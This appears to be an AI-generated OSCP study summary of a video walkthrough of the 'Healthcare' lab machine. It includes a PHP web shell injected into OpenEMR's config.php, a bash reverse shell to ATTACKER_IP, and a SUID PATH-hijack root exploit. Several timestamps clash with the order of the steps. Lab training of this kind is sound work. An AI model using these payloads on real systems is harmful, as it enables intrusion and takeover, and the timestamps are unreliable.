This comprehensive guide details the notes, commands, and methodology demonstrated in the video "Healthcare with S1REN!" to exploit a machine, providing valuable preparation for your OSCP exam.

***

## 📝 OSCP Preparation Notes & Methodology

The video demonstrates a classic penetration test flow for the OSCP: **Enumeration → Initial Foothold (SQLi/RCE) → Lateral Movement → Privilege Escalation.**

### Key OSCP Takeaways
| Concept | Description | Reference |
| :--- | :--- | :--- |
| **Patience is Key** | Exploits are often found through *thorough* enumeration. The difference between a small and a large wordlist can be the key directory. The presenter emphasizes this as a "pen tester with their feet up" moment, where you just wait for results. | [[34:32](http://www.youtube.com/watch?v=gvttLpfaZec&t=2072)], [[58:58](http://www.youtube.com/watch?v=gvttLpfaZec&t=3538)] |
| **Endpoint Discovery** | When an exploit (like SQLi) is found, the critical step is to identify the exact **endpoint** (e.g., `validateUser.php`) and **parameter** (`u`) to attempt manual exploitation or craft a specific payload. | [[01:02:45](http://www.youtube.com/watch?v=gvttLpfaZec&t=3765)] |
| **Manual vs. Automated** | Tools like `sqlmap` are used for *demonstration* only. On the OSCP exam, you must be able to manually exploit SQL injection and other vulnerabilities. | [[01:07:03](http://www.youtube.com/watch?v=gvttLpfaZec&t=4023)] |
| **Post-Compromise CMS Checks** | Once a Content Management System (CMS) is breached, immediately look for areas to gain code execution or pivot. These areas include: **File Uploads**, **Plugin/Template Management**, **Configuration Files**, and **Diagnostic Tools** (for command injection). | [[01:12:06](http://www.youtube.com/watch?v=gvttLpfaZec&t=4326)] |
| **Stable Shells** | Always upgrade your initial netcat reverse shell to a stable TTY. This prevents losing your session when pressing `Ctrl+C` or running commands that require an interactive terminal. | [[01:22:01](http://www.youtube.com/watch?v=gvttLpfaZec&t=4921)] |

***

## 💻 Essential Commands

### 1. Initial Enumeration & Scanning

| Command | Purpose | Timestamp |
| :--- | :--- | :--- |
| `nmap -p- -sV -sC $TARGET_IP --open` | Scan all 65535 ports, probe for service versions, run default scripts, and only show open ports. | [[02:10:44](http://www.youtube.com/watch?v=gvttLpfaZec&t=7844)] |
| `nmap -O $TARGET_IP` | Perform OS detection to guess the target's operating system (e.g., Linux Kernel 2.6.38). | [[02:38:48](http://www.youtube.com/watch?v=gvttLpfaZec&t=9528)] |
| `ftp $TARGET_IP` | Attempt connection to Port 21 (FTP), check for anonymous login (`anonymous`/`anonymous` or `anonymous`/`no password`). | [[02:25:01](http://www.youtube.com/watch?v=gvttLpfaZec&t=8701)] |
| `wfuzz -c -z file,/path/to/wordlist.txt --hh 999 $TARGET_URL/FUZZ/` | Directory/File fuzzing. The `-c` adds color, `-z file` specifies the wordlist, and **`--hh 999`** hides responses of a specific size (e.g., 999 bytes), often used to filter out noise or 403 pages. | [[03:22:28](http://www.youtube.com/watch?v=gvttLpfaZec&t=12148)] |
| `nikto -h $TARGET_URL` | Web server scanner to check for vulnerabilities, misconfigurations, and outdated software. | [[03:59:15](http://www.youtube.com/watch?v=gvttLpfaZec&t=14355)] |

### 2. Gaining a Foothold (SQLi & RCE)

| Command / Note | Purpose | Timestamp |
| :--- | :--- | :--- |
| **Vulnerability Discovered** | Directory fuzzing revealed `/openemr` (version 4.1.0), which is known to be vulnerable to SQL Injection. | [[57:53](http://www.youtube.com/watch?v=gvttLpfaZec&t=3473)] |
| **Target Endpoint** | The vulnerable file is **`interface/login/validateUser.php`** (parameter `u`). | [[01:02:45](http://www.youtube.com/watch?v=gvttLpfaZec&t=3765)] |
| `crackstation.net` (or Hashcat/John) | Used to crack the SHA1 hashes retrieved from the SQLi. | [[01:09:48](http://www.youtube.com/watch?v=gvttLpfaZec&t=4188)] |
| **Credentials Found** | `admin:akbar` and `medical:medical`. | [[01:10:37](http://www.youtube.com/watch?v=gvttLpfaZec&t=4237)] |
| **Backdoor Injection** | Gained RCE by modifying the `/openemr/library/config.php` file and injecting the PHP command **`<?php passthru($_GET['cmd']); ?>`** to execute OS commands via the `cmd` GET parameter. | [[01:18:45](http://www.youtube.com/watch?v=gvttLpfaZec&t=4725)] |
| `nc -lvnp 9090` | Set up a netcat listener on the attacker machine. | [[01:21:35](http://www.youtube.com/watch?v=gvttLpfaZec&t=4895)] |
| **Reverse Shell Payload** | After URL encoding, this bash command is sent to the RCE endpoint to connect back to the listener: `bash -i >& /dev/tcp/ATTACKER_IP/9090 0>&1` | [[01:20:34](http://www.youtube.com/watch?v=gvttLpfaZec&t=4834)] |
| `su medical` | Used the discovered password (`medical:medical`) to achieve **Lateral Movement** to a less-privileged user on the system. | [[01:24:32](http://www.youtube.com/watch?v=gvttLpfaZec&t=5072)] |

### 3. Privilege Escalation (Path Hijacking)

| Command / Note | Purpose | Timestamp |
| :--- | :--- | :--- |
| **Enumeration** | Used `find / -perm -u=s -type f 2>/dev/null` to identify SUID/SGID binaries. | [[01:33:14](http://www.youtube.com/watch?v=gvttLpfaZec&t=5594)] |
| **Vulnerable Binary** | The SUID binary `/usr/bin/health_check` was identified as the target. This binary calls other utilities (like `fdisk`) without an absolute path. | [[01:34:29](http://www.youtube.com/watch?v=gvttLpfaZec&t=5669)] |
| `cd /var/temp` | Navigate to a **world-writable** directory. | [[01:36:56](http://www.youtube.com/watch?v=gvttLpfaZec&t=5816)] |
| `echo -e '#!/bin/bash -p\n/bin/bash -p' > fdisk` | Create a malicious file named **`fdisk`** containing a root shell payload (`/bin/bash -p`), as `fdisk` is the program `health_check` executes. | [[01:39:12](http://www.youtube.com/watch?v=gvttLpfaZec&t=5952)] |
| `chmod +x fdisk` | Make the malicious file executable. | [[01:37:05](http://www.youtube.com/watch?v=gvttLpfaZec&t=5825)] |
| `export PATH=/var/temp:$PATH` | **Hijack the PATH** environment variable by placing the world-writable directory at the start. When `health_check` runs, it will execute our malicious `fdisk` before the legitimate one. | [[01:37:14](http://www.youtube.com/watch?v=gvttLpfaZec&t=5834)] |
| `/usr/bin/health_check` | Execute the SUID binary, which in turn executes the malicious `fdisk`, resulting in a root shell. | [[01:40:57](http://www.youtube.com/watch?v=gvttLpfaZec&t=6057)] |
| `cat /root/root.txt` | Read the final proof file to complete the machine. | [[01:41:21](http://www.youtube.com/watch?v=gvttLpfaZec&t=6081)] |

You can review the entire walkthrough at the following link: [Healthcare with S1REN!](http://www.youtube.com/watch?v=gvttLpfaZec)
http://googleusercontent.com/youtube_content/0